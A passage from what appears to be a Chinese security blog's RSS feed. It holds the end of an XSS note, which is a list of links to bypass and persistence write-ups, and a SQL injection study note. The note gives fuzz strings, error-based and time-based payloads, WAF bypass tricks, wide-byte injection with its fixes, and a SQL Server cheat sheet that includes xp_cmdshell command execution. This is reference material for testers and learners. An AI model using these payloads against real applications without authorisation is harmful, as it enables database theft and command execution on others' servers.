&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==&#34;&gt;xss auditor bypass writeup&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz&#34;&gt;bypassing csp using polyglot jpegs&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv&#34;&gt;bypass xss filters using javascript global variables&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;持久化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化-2&#34;&gt;#&lt;/a&gt; 持久化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4&#34;&gt;变种 XSS 持久控制 by tig3r&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s&#34;&gt;Using Appcache and ServiceWorker for Evil&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj&#34;&gt;Service Worker 安全探索&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj&#34;&gt;前端黑魔法&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</guid>
            <title>SQL注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>SQL注入</category>
            <pubDate>Sat, 26 Nov 2022 11:05:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;注入分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入分类&#34;&gt;#&lt;/a&gt; 注入分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。&lt;/p&gt;
&lt;h2 id=&#34;按技巧分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按技巧分类&#34;&gt;#&lt;/a&gt; 按技巧分类&lt;/h2&gt;
&lt;p&gt;根据使用的技巧，SQL 注入类型可分为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;盲注&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;布尔盲注：只能从应用返回中推断语句执行后的布尔值&lt;/li&gt;
&lt;li&gt;时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;报错注入：应用会显示全部或者部分的报错信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;堆叠注入：有的应用可以加入  &lt;code&gt;;&lt;/code&gt;  后一次执行多条语句&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其他&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;按获取数据的方式分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按获取数据的方式分类&#34;&gt;#&lt;/a&gt; 按获取数据的方式分类&lt;/h2&gt;
&lt;p&gt;另外也可以根据获取数据的方式分为 3 类&lt;/p&gt;
&lt;h3 id=&#34;inband&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inband&#34;&gt;#&lt;/a&gt; inband&lt;/h3&gt;
&lt;p&gt;利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。&lt;/p&gt;
&lt;h3 id=&#34;inference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inference&#34;&gt;#&lt;/a&gt; inference&lt;/h3&gt;
&lt;p&gt;通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。&lt;/p&gt;
&lt;h3 id=&#34;out-of-band-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#out-of-band-oob&#34;&gt;#&lt;/a&gt; out of band (OOB)&lt;/h3&gt;
&lt;p&gt;通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。&lt;/p&gt;
&lt;h1 id=&#34;注入检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入检测&#34;&gt;#&lt;/a&gt; 注入检测&lt;/h1&gt;
&lt;h2 id=&#34;常见的注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的注入点&#34;&gt;#&lt;/a&gt; 常见的注入点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;GET/POST/PUT/DELETE 参数&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;文件名&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fuzz注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuzz注入点&#34;&gt;#&lt;/a&gt; Fuzz 注入点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  /  &lt;code&gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1/1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1/0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and 1=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot; and &amp;quot;1&amp;quot;=&amp;quot;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and 1=2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or 1=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or 1=&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;   &lt;code&gt;-&lt;/code&gt;   &lt;code&gt;^&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;   &lt;code&gt;%&lt;/code&gt;   &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;   &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;   &lt;code&gt;||&lt;/code&gt;   &lt;code&gt;|&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;反引号执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试用常量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用常量&#34;&gt;#&lt;/a&gt; 测试用常量&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@servername&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@language&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@spid&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试列数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试列数&#34;&gt;#&lt;/a&gt; 测试列数&lt;/h2&gt;
&lt;p&gt;例如  &lt;code&gt;http://www.foo.com/index.asp?id=12+union+select+null,null--&lt;/code&gt;  ，不断增加  &lt;code&gt;null&lt;/code&gt;  至不返回&lt;/p&gt;
&lt;h2 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select 1/0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;extractvalue(1, concat(0x5c,(select user())))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;updatexml(0x3a,concat(1,(select user())),1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exp(~(SELECT * from(select user())a))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ST_LatFromGeoHash((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GTID_SUBSET(version(), 1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于geometric的报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于geometric的报错注入&#34;&gt;#&lt;/a&gt; 基于 geometric 的报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GeometryCollection((select * from (select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;polygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multipoint((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multilinestring((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LINESTRING((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multipolygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==&#34;&gt;commit 95825f&lt;/span&gt; 。&lt;/p&gt;
&lt;p&gt;而以上列表中基于 geometric 的报错注入在这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==&#34;&gt;commit 5caea4&lt;/span&gt; 中被修复，在 5.5.x 较后的版本中同样不再生效。&lt;/p&gt;
&lt;h2 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; 堆叠注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;;select 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;注释符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释符&#34;&gt;#&lt;/a&gt; 注释符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--+&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!50000xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;判断过滤规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断过滤规则&#34;&gt;#&lt;/a&gt; 判断过滤规则&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是否有 trunc&lt;/li&gt;
&lt;li&gt;是否过滤某个字符&lt;/li&gt;
&lt;li&gt;是否过滤关键字&lt;/li&gt;
&lt;li&gt;slash 和编码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;获取信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取信息&#34;&gt;#&lt;/a&gt; 获取信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;判断数据库类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and exists (select * from msysobjects ) &amp;gt; 0&lt;/code&gt;  access 数据库&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and exists (select * from sysobjects ) &amp;gt; 0&lt;/code&gt;  SQLServer 数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断数据库表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and exsits (select * from admin)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;版本、主机名、用户名、库名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;表和字段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;确定字段数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Order By&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Select Into&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;表名、列名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试权限&#34;&gt;#&lt;/a&gt; 测试权限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;文件操作
&lt;ul&gt;
&lt;li&gt;读敏感文件&lt;/li&gt;
&lt;li&gt;写 shell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;带外通道
&lt;ul&gt;
&lt;li&gt;网络请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
&lt;h2 id=&#34;udf提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udf提权&#34;&gt;#&lt;/a&gt; UDF 提权&lt;/h2&gt;
&lt;p&gt;UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。&lt;/p&gt;
&lt;p&gt;当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。&lt;/p&gt;
&lt;h1 id=&#34;数据库检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库检测&#34;&gt;#&lt;/a&gt; 数据库检测&lt;/h1&gt;
&lt;h2 id=&#34;mysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql&#34;&gt;#&lt;/a&gt; MySQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sleep  &lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;benchmark  &lt;code&gt;BENCHMARK(5000000, MD5(&#39;test&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT &#39;a&#39; &#39;b&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;识别用函数
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;connection_id()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;last_insert_id()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;row_count()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oracle&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle&#34;&gt;#&lt;/a&gt; Oracle&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;a&#39;||&#39;oracle&#39; --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version WHERE rownum=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sqlserver&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlserver&#34;&gt;#&lt;/a&gt; SQLServer&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;WAITFOR  &lt;code&gt;WAITFOR DELAY &#39;00:00:10&#39;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SERVERNAME  &lt;code&gt;SELECT @@SERVERNAME&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;version  &lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT &#39;some&#39;+&#39;string&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常量
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@@pack_received&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@rowcount&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;postgresql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgresql&#34;&gt;#&lt;/a&gt; PostgreSQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sleep  &lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大小写&lt;/li&gt;
&lt;li&gt;url 编码&lt;/li&gt;
&lt;li&gt;html 编码&lt;/li&gt;
&lt;li&gt;十六进制编码&lt;/li&gt;
&lt;li&gt;unicode 编码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注释&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;//&lt;/code&gt;   &lt;code&gt;--&lt;/code&gt;   &lt;code&gt;-- +&lt;/code&gt;   &lt;code&gt;-- -&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;   &lt;code&gt;/**/&lt;/code&gt;   &lt;code&gt;;%00&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;内联注释用的更多，它有一个特性  &lt;code&gt;/!**/&lt;/code&gt;  只有 MySQL 能识别&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只过滤了一次时&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;union&lt;/code&gt;  =&amp;gt;  &lt;code&gt;ununionion&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相同功能替换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数替换
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;substring&lt;/code&gt;  /  &lt;code&gt;mid&lt;/code&gt;  /  &lt;code&gt;sub&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ascii&lt;/code&gt;  /  &lt;code&gt;hex&lt;/code&gt;  /  &lt;code&gt;bin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;benchmark&lt;/code&gt;  /  &lt;code&gt;sleep&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量替换
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;user()&lt;/code&gt;  /  &lt;code&gt;@@user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;符号和关键字
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and&lt;/code&gt;  / `&amp;amp;``&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or&lt;/code&gt;  /  &lt;code&gt;|&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP 参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP 参数污染
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=1&amp;amp;id=2&amp;amp;id=3&lt;/code&gt;  根据容器不同会有不同的结果&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP 分割注入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;缓冲区溢出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sql注入小技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入小技巧&#34;&gt;#&lt;/a&gt; SQL 注入小技巧&lt;/h1&gt;
&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h2&gt;
&lt;p&gt;一般程序员用 gbk 编码做开发的时候，会用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  来设定，这句话等同于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set
character_set_connection = &#39;gbk&#39;,
character_set_result = &#39;gbk&#39;,
character_set_client = &#39;gbk&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;漏洞发生的原因是执行了  &lt;code&gt;set character_set_client = &#39;gbk&#39;;&lt;/code&gt;  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  的话 real_escape 是不知道设置的数据的编码的，就会加  &lt;code&gt;%5c&lt;/code&gt;  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。&lt;/p&gt;
&lt;p&gt;解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  &lt;code&gt;mysql_set_charset(&#39;gbk&#39;)&lt;/code&gt;  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。&lt;/p&gt;
&lt;p&gt;还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。&lt;/p&gt;
&lt;h1 id=&#34;cheatsheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet&#34;&gt;#&lt;/a&gt; CheatSheet&lt;/h1&gt;
&lt;h2 id=&#34;sql-server-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-server-payload&#34;&gt;#&lt;/a&gt; SQL Server Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Version&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;Edition&#39;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;EngineEdition&#39;);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x01 - 0x20&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user_name()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``SELECT system_user`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户权限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;db_owner&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List User&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT name FROM master..syslogins&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT name FROM master..sysdatabases&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select concat_ws(table_schema,table_name,column_name) from information_schema.columns&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行命令&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;EXEC xp_cmdshell &#39;net user&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ascii&lt;/p&gt;
&lt;ul&gt;
